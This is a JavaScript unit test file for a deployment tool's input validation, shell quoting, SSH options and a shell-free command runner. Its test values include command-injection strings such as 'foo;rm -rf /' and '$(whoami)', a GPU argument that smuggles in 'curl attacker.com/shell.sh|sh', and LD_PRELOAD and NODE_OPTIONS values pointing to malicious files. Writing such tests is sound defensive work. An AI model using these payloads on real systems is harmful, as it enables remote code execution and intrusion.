// SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
// SPDX-License-Identifier: Apache-2.0

const { describe, it } = require("node:test");
const assert = require("node:assert/strict");

const {
  validateInstanceName,
  shellQuote,
  SSH_OPTS,
} = require("../bin/lib/deploy");

const { runArgv, runCaptureArgv } = require("../bin/lib/runner");

describe("deploy helpers", () => {
  describe("validateInstanceName", () => {
    it("accepts valid names", () => {
      for (const name of ["my-box", "prod.server", "test_01", "a", "A1-b.c_d"]) {
        assert.doesNotThrow(() => validateInstanceName(name));
      }
    });

    it("rejects names starting with hyphen", () => {
      assert.throws(() => validateInstanceName("-bad"), /Invalid instance name/);
    });

    it("rejects shell injection", () => {
      assert.throws(() => validateInstanceName("foo;rm -rf /"), /Invalid instance name/);
    });

    it("rejects command substitution", () => {
      assert.throws(() => validateInstanceName("$(whoami)"), /Invalid instance name/);
    });

    it("rejects empty string", () => {
      assert.throws(() => validateInstanceName(""), /Invalid instance name/);
    });

    it("rejects names with spaces", () => {
      assert.throws(() => validateInstanceName("foo bar"), /Invalid instance name/);
    });

    it("rejects backtick command substitution", () => {
      assert.throws(() => validateInstanceName("`whoami`"), /Invalid instance name/);
    });

    it("rejects pipe", () => {
      assert.throws(() => validateInstanceName("foo|bar"), /Invalid instance name/);
    });

    it("rejects names starting with dot", () => {
      assert.throws(() => validateInstanceName(".hidden"), /Invalid instance name/);
    });

    it("rejects names longer than 253 characters", () => {
      assert.throws(() => validateInstanceName("a".repeat(254)), /Invalid instance name/);
    });

    it("accepts names at the 253 character limit", () => {
      assert.doesNotThrow(() => validateInstanceName("a".repeat(253)));
    });

    it("rejects non-string types", () => {
      assert.throws(() => validateInstanceName(42), /Invalid instance name/);
      assert.throws(() => validateInstanceName({ toString: () => "valid" }), /Invalid instance name/);
    });
  });

  describe("shellQuote", () => {
    it("wraps in single quotes", () => {
      assert.equal(shellQuote("hello"), "'hello'");
    });

    it("escapes embedded single quotes", () => {
      assert.equal(shellQuote("it's"), "'it'\\''s'");
    });
  });

  describe("SSH_OPTS", () => {
    it("uses StrictHostKeyChecking=accept-new (TOFU)", () => {
      assert.ok(SSH_OPTS.includes("StrictHostKeyChecking=accept-new"));
    });

    it("does not contain StrictHostKeyChecking=no", () => {
      assert.ok(!SSH_OPTS.some((o) => o.includes("StrictHostKeyChecking=no")));
    });
  });

  // ── Injection PoC ──────────────────────────────────────────────
  // Prove that argv arrays (spawnSync without shell) treat shell
  // metacharacters as literal text. These are the 5 injection methods
  // that bash -c would execute but argv arrays do not.

  describe("argv injection proof-of-concept", () => {
    it("$() subshell is literal, not expanded", () => {
      const out = runCaptureArgv("echo", ["$(echo PWNED)"]);
      assert.equal(out, "$(echo PWNED)");
    });

    it("backtick substitution is literal, not executed", () => {
      const out = runCaptureArgv("echo", ["`echo HACKED`"]);
      assert.equal(out, "`echo HACKED`");
    });

    it("semicolon chaining is literal, not split", () => {
      const out = runCaptureArgv("echo", ["hello; echo INJECTED"]);
      assert.equal(out, "hello; echo INJECTED");
    });

    it("pipe is literal, not interpreted", () => {
      const out = runCaptureArgv("echo", ["data | cat /etc/passwd"]);
      assert.equal(out, "data | cat /etc/passwd");
    });

    it("&& chaining is literal, not executed", () => {
      const out = runCaptureArgv("echo", ["ok && echo PWNED"]);
      assert.equal(out, "ok && echo PWNED");
    });
  });

  describe("runCaptureArgv", () => {
    it("captures stdout without shell interpretation", () => {
      const out = runCaptureArgv("echo", ["hello", "world"]);
      assert.equal(out, "hello world");
    });

    it("returns empty string on failure with ignoreError", () => {
      const out = runCaptureArgv("false", [], { ignoreError: true });
      assert.equal(out, "");
    });

    it("passes $() literally through argv", () => {
      const out = runCaptureArgv("echo", ["$(whoami)"]);
      assert.equal(out, "$(whoami)");
    });
  });

  describe("runSsh", () => {
    // We can't call runSsh directly (it calls runArgv which exits on failure),
    // but we can verify the SSH_OPTS constants and the argv construction pattern

    it("SSH_OPTS contains accept-new and LogLevel=ERROR", () => {
      assert.deepEqual(SSH_OPTS, [
        "-o", "StrictHostKeyChecking=accept-new",
        "-o", "LogLevel=ERROR",
      ]);
    });

    it("SSH_OPTS does not contain StrictHostKeyChecking=no", () => {
      const joined = SSH_OPTS.join(" ");
      assert.ok(!joined.includes("StrictHostKeyChecking=no"));
    });
  });

  describe("runArgv security properties", () => {
    it("passes sandbox names with hyphens literally", () => {
      const out = runCaptureArgv("echo", ["my-assistant"]);
      assert.equal(out, "my-assistant");
    });

    it("passes GPU specs with colons literally", () => {
      const out = runCaptureArgv("echo", ["a2-highgpu-1g:nvidia-tesla-a100:1"]);
      assert.equal(out, "a2-highgpu-1g:nvidia-tesla-a100:1");
    });

    it("prevents NEMOCLAW_GPU injection via brev create", () => {
      const maliciousGpu = 'a100"; curl attacker.com/shell.sh|sh; echo "';
      const out = runCaptureArgv("echo", ["--gpu", maliciousGpu]);
      assert.equal(out, `--gpu ${maliciousGpu}`);
    });

    it("passes file paths with spaces literally", () => {
      const out = runCaptureArgv("echo", ["/path/with spaces/file.txt"]);
      assert.equal(out, "/path/with spaces/file.txt");
    });

    it("passes environment variable syntax literally", () => {
      const out = runCaptureArgv("echo", ["NVIDIA_API_KEY=${SECRET}"]);
      assert.equal(out, "NVIDIA_API_KEY=${SECRET}");
    });

    it("shell: true in opts cannot override the lock", () => {
      const out = runCaptureArgv("echo", ["$(echo PWNED)"], { shell: true });
      assert.equal(out, "$(echo PWNED)");
    });

    it("cwd in opts cannot override ROOT", () => {
      const out = runCaptureArgv("pwd", []);
      const outWithCwd = runCaptureArgv("pwd", [], { cwd: "/tmp" });
      assert.equal(out, outWithCwd);
    });

    it("LD_PRELOAD in caller env is stripped", () => {
      const out = runCaptureArgv("printenv", ["LD_PRELOAD"], {
        env: { LD_PRELOAD: "/tmp/evil.so" },
        ignoreError: true,
      });
      assert.equal(out, "");
    });

    it("NODE_OPTIONS in caller env is stripped", () => {
      const out = runCaptureArgv("printenv", ["NODE_OPTIONS"], {
        env: { NODE_OPTIONS: "--require=/tmp/evil.js" },
        ignoreError: true,
      });
      assert.equal(out, "");
    });

    it("safe caller env vars pass through", () => {
      const out = runCaptureArgv("printenv", ["MY_CUSTOM_VAR"], {
        env: { MY_CUSTOM_VAR: "hello" },
      });
      assert.equal(out, "hello");
    });
  });
});
